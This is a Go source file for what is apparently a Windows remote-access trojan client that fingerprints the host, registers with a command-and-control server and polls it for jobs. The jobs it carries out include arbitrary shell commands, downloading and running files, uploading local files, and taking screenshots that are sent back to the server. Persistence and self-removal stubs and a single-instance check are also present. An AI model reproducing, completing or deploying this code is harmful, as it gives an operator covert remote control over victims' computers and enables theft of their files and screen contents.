package main

import (
	"Worker/system/win"
	"Worker/utils"
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/kbinani/screenshot"
	"net/http"
	"os"
	"path"
	"strconv"
	"strings"
	"time"
)

type Worker struct {
	id        string
	isAdmin   bool
	boostMode bool // TODO: after new start we need to notify server about disabled boost!
}

type HostInfo struct {
	Id       string `json:"id"`
	Hostname string `json:"hostname"`
	Os       string `json:"os"`
	IpAddr   string `json:"ip_addr"`
	Country  string `json:"country"`
	Boost    bool   `json:"boost"`
	IsAdmin  bool   `json:"is_admin"`
}

type HardwareInfo struct {
	Gpu string `json:"gpu"`
	Cpu string `json:"cpu"`
	Ram string `json:"ram"`
}

func NewWorker() *Worker {
	uuid, _ := win.GetMachineGuid()
	uuid, _ = utils.UuidStrToBase64Str(uuid)
	return &Worker{
		id:        uuid,
		isAdmin:   win.ProcessHasAdminRights(),
		boostMode: true, // TODO: remove later!
	}
}

// TODO: call this method only if worker not persisted!
func (w *Worker) register() bool {
	hostInfo := HostInfo{Id: w.id, IsAdmin: w.isAdmin, Boost: false}
	hostInfo.Hostname, _ = os.Hostname()
	hostInfo.Os, _ = win.GetOsName()
	hostInfo.IpAddr, hostInfo.Country = utils.GetMyIpCountry()

	reqBody, _ := json.Marshal(hostInfo)
	for i := 1; i <= MAX_RETRIES; i++ {
		resp, err := http.Post(REGISTER_URL, "application/json", bytes.NewBuffer(reqBody))
		if err == nil {
			resp.Body.Close()
			w.tellHardwareInfo()
			return true
		}
		time.Sleep(time.Minute * time.Duration(i))
	}
	return false
}

func (w *Worker) tellHardwareInfo() {
	hardwareInfo := HardwareInfo{}
	hardwareInfo.Gpu, _ = win.GetGpuName()
	hardwareInfo.Cpu, _ = win.GetCpuName()
	totalRam, _ := win.GetTotalRam()
	hardwareInfo.Ram = utils.ToReadableSize(totalRam)

	reqBody, _ := json.Marshal(hardwareInfo)
	resp, err := http.Post(fmt.Sprintf(HARDWARE_URL, w.id), "application/json", bytes.NewBuffer(reqBody))
	if err == nil {
		resp.Body.Close()
	}
}

func (w *Worker) poll() {
	jobsUrl := fmt.Sprintf(JOBS_URL, w.id)
	retryN := 0
	for {
		resp, err := http.Get(jobsUrl)
		if err != nil {
			retryN++
			if retryN == MAX_RETRIES {
				w.kill()
				return
			}
			time.Sleep(time.Minute * time.Duration(retryN))
			continue
		}
		retryN = 0
		var jobs []Job
		err = json.NewDecoder(resp.Body).Decode(&jobs)
		if err != nil {
			fmt.Println(err)
			goto end
		}
		if len(jobs) > 1 {
			sortJobsByTime(jobs)
		}
		for _, j := range jobs {
			err = w.resolve(&j)
			if err != nil {
				w.report(j.Id, err.Error())
			}
		}
	end:
		if w.boostMode {
			time.Sleep(time.Duration(MIN_DELAY) * time.Second)
		} else {
			time.Sleep(time.Duration(utils.RandomInt(MIN_DELAY, MAX_DELAY)) * time.Second)
		}
	}
}

func (w *Worker) resolve(job *Job) error {
	todo, args := job.parse()
	fmt.Println(job.Todo)
	switch todo {
	case SHELL_CMD:
		if output := win.ExecuteCommand(args...); output != "" {
			w.report(job.Id, output)
			return nil
		}
		w.report(job.Id, "Command executed successfully.")
	case BOOST:
		if args[0] == "on" {
			w.boostMode = true
			w.report(job.Id, "Boost mode turned on.")
		} else if args[0] == "off" {
			w.boostMode = false
			w.report(job.Id, "Boost mode turned off.")
		} else {
			w.report(job.Id, "Wrong boost parameter.")
		}
	case SLEEP:
		val, err := strconv.Atoi(args[0])
		if err != nil {
			return err
		}
		w.report(job.Id, "Sleeping for "+args[0]+" seconds.")
		time.Sleep(time.Duration(val) * time.Second)
	case DOWNLOAD:
		if err := win.DownloadNExecute(args[0], args[1]); err != nil {
			return err
		}
		w.report(job.Id, "File downloaded and executed.")
	case UPLOAD:
		loc, err := utils.UploadFile(args[0], fmt.Sprintf(UPLOADS_URL, w.id))
		if err != nil {
			return err
		}
		w.report(job.Id, "File uploaded to "+path.Join(SERVER_ADDR, loc))
	case CHDIR:
		if err := os.Chdir(args[0]); err != nil {
			return err
		}
		w.report(job.Id, "Directory changed to "+args[0])
	case MSG:
		win.ShowInfoDialog(args[0], args[1])
		w.report(job.Id, "Message shown successfully.")
	case SCREENSHOT:
		img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(0))
		if err != nil {
			return err
		}
		loc, err := utils.UploadImage(img, "screen", fmt.Sprintf(UPLOADS_URL, w.id))
		if err != nil {
			return err
		}
		w.report(job.Id, "Screenshot uploaded to "+path.Join(SERVER_ADDR, loc))
	case UNKNOWN:
		w.report(job.Id, "Received job has wrong format.")
	}
	return nil
}

func (w *Worker) report(jobId int, rep string) {
	resp, err := http.Post(fmt.Sprintf(REPORT_URL, w.id, jobId), "text/plain;charset=UTF-8",
		strings.NewReader(rep))
	if err == nil {
		resp.Body.Close()
	}
}

func (w *Worker) persist() {

}

func (w *Worker) kill() {

}

func (w *Worker) exists() {

}

func (w *Worker) run() {
	// if !w.persisted()
	// w.persist()
	if ok, _ := win.ProcessAlreadyRunning(); ok {
		return
	}
	if !w.register() {
		w.kill()
	} else {
		w.poll()
	}
}
